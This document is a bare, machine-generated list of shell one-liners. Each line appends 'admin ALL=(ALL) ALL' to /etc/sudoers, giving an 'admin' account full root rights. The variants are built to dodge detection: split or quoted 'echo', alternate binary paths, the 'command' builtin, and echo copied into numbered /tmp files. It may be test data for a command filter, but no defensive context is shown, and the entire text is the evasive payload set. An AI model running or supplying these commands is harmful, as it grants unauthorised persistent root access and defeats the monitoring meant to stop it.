"echo"  "admin ALL=(ALL) ALL" >> /etc/sudoers
"echo" "admin ALL=(ALL) ALL" >> /etc/sudoers
"echo""admin ALL=(ALL) ALL" >> /etc/sudoers
'echo'  "admin ALL=(ALL) ALL" >> /etc/sudoers
'echo' "admin ALL=(ALL) ALL" >> /etc/sudoers
'echo'"admin ALL=(ALL) ALL" >> /etc/sudoers
/bin/"echo"  "admin ALL=(ALL) ALL" >> /etc/sudoers
/bin/"echo" "admin ALL=(ALL) ALL" >> /etc/sudoers
/bin/"echo""admin ALL=(ALL) ALL" >> /etc/sudoers
/bin/'echo'  "admin ALL=(ALL) ALL" >> /etc/sudoers
/bin/'echo' "admin ALL=(ALL) ALL" >> /etc/sudoers
/bin/'echo'"admin ALL=(ALL) ALL" >> /etc/sudoers
/bin/e""cho  "admin ALL=(ALL) ALL" >> /etc/sudoers
/bin/e""cho "admin ALL=(ALL) ALL" >> /etc/sudoers
/bin/e""cho"admin ALL=(ALL) ALL" >> /etc/sudoers
/bin/e''cho  "admin ALL=(ALL) ALL" >> /etc/sudoers
/bin/e''cho "admin ALL=(ALL) ALL" >> /etc/sudoers
/bin/e''cho"admin ALL=(ALL) ALL" >> /etc/sudoers
/bin/echo  "admin ALL=(ALL) ALL" >> /etc/sudoers
/bin/echo "admin ALL=(ALL) ALL" >> /etc/sudoers
/bin/echo"admin ALL=(ALL) ALL" >> /etc/sudoers
/usr/bin/"echo"  "admin ALL=(ALL) ALL" >> /etc/sudoers
/usr/bin/"echo" "admin ALL=(ALL) ALL" >> /etc/sudoers
/usr/bin/"echo""admin ALL=(ALL) ALL" >> /etc/sudoers
/usr/bin/'echo'  "admin ALL=(ALL) ALL" >> /etc/sudoers
/usr/bin/'echo' "admin ALL=(ALL) ALL" >> /etc/sudoers
/usr/bin/'echo'"admin ALL=(ALL) ALL" >> /etc/sudoers
/usr/bin/e""cho  "admin ALL=(ALL) ALL" >> /etc/sudoers
/usr/bin/e""cho "admin ALL=(ALL) ALL" >> /etc/sudoers
/usr/bin/e""cho"admin ALL=(ALL) ALL" >> /etc/sudoers
/usr/bin/e''cho  "admin ALL=(ALL) ALL" >> /etc/sudoers
/usr/bin/e''cho "admin ALL=(ALL) ALL" >> /etc/sudoers
/usr/bin/e''cho"admin ALL=(ALL) ALL" >> /etc/sudoers
/usr/bin/echo  "admin ALL=(ALL) ALL" >> /etc/sudoers
/usr/bin/echo "admin ALL=(ALL) ALL" >> /etc/sudoers
/usr/bin/echo"admin ALL=(ALL) ALL" >> /etc/sudoers
command "echo"  "admin ALL=(ALL) ALL" >> /etc/sudoers
command "echo" "admin ALL=(ALL) ALL" >> /etc/sudoers
command "echo""admin ALL=(ALL) ALL" >> /etc/sudoers
command 'echo'  "admin ALL=(ALL) ALL" >> /etc/sudoers
command 'echo' "admin ALL=(ALL) ALL" >> /etc/sudoers
command 'echo'"admin ALL=(ALL) ALL" >> /etc/sudoers
command e""cho  "admin ALL=(ALL) ALL" >> /etc/sudoers
command e""cho "admin ALL=(ALL) ALL" >> /etc/sudoers
command e""cho"admin ALL=(ALL) ALL" >> /etc/sudoers
command e''cho  "admin ALL=(ALL) ALL" >> /etc/sudoers
command e''cho "admin ALL=(ALL) ALL" >> /etc/sudoers
command e''cho"admin ALL=(ALL) ALL" >> /etc/sudoers
command echo  "admin ALL=(ALL) ALL" >> /etc/sudoers
command echo "admin ALL=(ALL) ALL" >> /etc/sudoers
command echo"admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_0 && /tmp/tmp_bin_0 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_12 && /tmp/tmp_bin_12 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_120 && /tmp/tmp_bin_120 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_121 && /tmp/tmp_bin_121 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_122 && /tmp/tmp_bin_122 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_123 && /tmp/tmp_bin_123 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_124 && /tmp/tmp_bin_124 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_125 && /tmp/tmp_bin_125 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_126 && /tmp/tmp_bin_126 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_127 && /tmp/tmp_bin_127 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_128 && /tmp/tmp_bin_128 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_129 && /tmp/tmp_bin_129 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_13 && /tmp/tmp_bin_13 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_130 && /tmp/tmp_bin_130 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_131 && /tmp/tmp_bin_131 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_132 && /tmp/tmp_bin_132 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_133 && /tmp/tmp_bin_133 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_134 && /tmp/tmp_bin_134 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_135 && /tmp/tmp_bin_135 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_136 && /tmp/tmp_bin_136 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_137 && /tmp/tmp_bin_137 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_138 && /tmp/tmp_bin_138 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_139 && /tmp/tmp_bin_139 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_14 && /tmp/tmp_bin_14 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_140 && /tmp/tmp_bin_140 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_141 && /tmp/tmp_bin_141 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_142 && /tmp/tmp_bin_142 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_143 && /tmp/tmp_bin_143 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_144 && /tmp/tmp_bin_144 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_145 && /tmp/tmp_bin_145 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_146 && /tmp/tmp_bin_146 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_147 && /tmp/tmp_bin_147 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_148 && /tmp/tmp_bin_148 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_149 && /tmp/tmp_bin_149 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_15 && /tmp/tmp_bin_15 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_150 && /tmp/tmp_bin_150 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_151 && /tmp/tmp_bin_151 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_152 && /tmp/tmp_bin_152 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_153 && /tmp/tmp_bin_153 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_154 && /tmp/tmp_bin_154 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_155 && /tmp/tmp_bin_155 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_156 && /tmp/tmp_bin_156 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_157 && /tmp/tmp_bin_157 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_158 && /tmp/tmp_bin_158 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_159 && /tmp/tmp_bin_159 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_16 && /tmp/tmp_bin_16 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_160 && /tmp/tmp_bin_160 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_161 && /tmp/tmp_bin_161 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_162 && /tmp/tmp_bin_162 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_163 && /tmp/tmp_bin_163 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_164 && /tmp/tmp_bin_164 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_165 && /tmp/tmp_bin_165 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_166 && /tmp/tmp_bin_166 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_167 && /tmp/tmp_bin_167 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_168 && /tmp/tmp_bin_168 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_169 && /tmp/tmp_bin_169 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_17 && /tmp/tmp_bin_17 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_170 && /tmp/tmp_bin_170 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_171 && /tmp/tmp_bin_171 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_172 && /tmp/tmp_bin_172 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_173 && /tmp/tmp_bin_173 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_174 && /tmp/tmp_bin_174 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_175 && /tmp/tmp_bin_175 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_176 && /tmp/tmp_bin_176 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_177 && /tmp/tmp_bin_177 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_178 && /tmp/tmp_bin_178 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_179 && /tmp/tmp_bin_179 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_18 && /tmp/tmp_bin_18 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_180 && /tmp/tmp_bin_180 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_181 && /tmp/tmp_bin_181 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_182 && /tmp/tmp_bin_182 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_183 && /tmp/tmp_bin_183 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_184 && /tmp/tmp_bin_184 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_185 && /tmp/tmp_bin_185 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_186 && /tmp/tmp_bin_186 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_187 && /tmp/tmp_bin_187 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_188 && /tmp/tmp_bin_188 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_189 && /tmp/tmp_bin_189 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_19 && /tmp/tmp_bin_19 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_190 && /tmp/tmp_bin_190 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_191 && /tmp/tmp_bin_191 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_192 && /tmp/tmp_bin_192 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_193 && /tmp/tmp_bin_193 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_194 && /tmp/tmp_bin_194 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_195 && /tmp/tmp_bin_195 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_196 && /tmp/tmp_bin_196 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_197 && /tmp/tmp_bin_197 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_198 && /tmp/tmp_bin_198 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_199 && /tmp/tmp_bin_199 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_2 && /tmp/tmp_bin_2 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_20 && /tmp/tmp_bin_20 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_200 && /tmp/tmp_bin_200 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_201 && /tmp/tmp_bin_201 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_202 && /tmp/tmp_bin_202 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_203 && /tmp/tmp_bin_203 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_204 && /tmp/tmp_bin_204 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_205 && /tmp/tmp_bin_205 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_206 && /tmp/tmp_bin_206 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_207 && /tmp/tmp_bin_207 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_208 && /tmp/tmp_bin_208 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_209 && /tmp/tmp_bin_209 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_21 && /tmp/tmp_bin_21 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_210 && /tmp/tmp_bin_210 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_211 && /tmp/tmp_bin_211 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_212 && /tmp/tmp_bin_212 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_213 && /tmp/tmp_bin_213 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_214 && /tmp/tmp_bin_214 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_215 && /tmp/tmp_bin_215 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_216 && /tmp/tmp_bin_216 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_217 && /tmp/tmp_bin_217 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_218 && /tmp/tmp_bin_218 "admin ALL=(ALL) ALL" >> /etc/sudoers
cp $(which echo 2>/dev/null || echo echo) /tmp/tmp_bin_219 && /tmp/tmp_bin_219 "admin ALL=(ALL) ALL" >> /etc/sudoers
